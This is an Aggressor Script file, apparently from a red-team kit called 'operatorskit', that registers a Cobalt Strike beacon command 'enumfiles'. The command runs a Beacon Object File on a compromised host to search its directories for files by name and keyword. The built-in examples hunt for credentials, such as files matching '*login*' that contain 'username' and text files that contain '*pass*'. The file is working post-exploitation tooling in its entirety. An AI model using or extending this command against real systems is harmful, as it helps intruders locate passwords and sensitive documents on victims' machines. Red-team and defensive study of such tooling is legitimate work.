beacon_command_register(
    "enumfiles",
    "/c0Search for matching files based on a word, extention or keyword.\o",
    "\c7Search for matching files based on a word, extention or keyword in the file content. Wildcards are supported.\o\n" .
    "\c7Keyword matching only works for text based files.\o\n\n" .
	
    "ARGUMENTS:\n" .
    "  [<path to directory>]: specify a path to the directory from which to start searching (recursive searching supported).\n" .
    "  [<search pattern>]: specify a single word or extention to search for (support wildcards).\n" .
    "  [<keyword>]: leave empty OR specify a keyword to search for in text based files (support wildcards).\n\n" .
	
    "USAGE:\n" .
    "  enumfiles <path to directory> <search pattern> <(optional) keyword> \n\n" .
	
    "EXAMPLES:\n" .
    "  enumfiles C:\\Users\\RTO\\Documents *.xlsx\n" .
    "  enumfiles C:\\Users\\RTO *login*.* username\n" .
    "  enumfiles C:\\Users\\RTO *.txt *pass*\n\n",
    "operatorskit"
);

alias enumfiles
{
    local('$bid %cmd $arg_data $bof_path $output_name');
    local('$lpDirectory $lpSearchPattern $keyword');

    ($bid) = @_;

    $bof_path    = "enumfiles.o";
	$output_name = "enum_files";

    %cmd = parse_command(@_);

    if (%cmd is $null)
    {
        berror($bid, "Error parsing command\n");
        return;
    }

    %cmd["file"] = generate_file_name($bid, %cmd["file"], $output_name);

	$lpDirectory     = %cmd["args"][0];
    $lpSearchPattern = %cmd["args"][1];
    $keyword         = %cmd["args"][2];

    #
    # Validation
    #

    if ($lpDirectory eq "")
    {
        berror($bid, "Please specify a path to a directory.\n");
        return;
    }

    if ($lpSearchPattern eq "")
    {
        berror($bid, "Please specify a pattern/word to search for.\n");
        return;
    }

    # Pack our arguments
    $arg_data  = bof_pack($bid, "zzz", $lpDirectory, $lpSearchPattern, $keyword);

    blog($bid, "Tasked to search for matching files..");

    handle_output_beacon_inline_execute($bid, $bof_path, "go", %cmd, $arg_data);
}
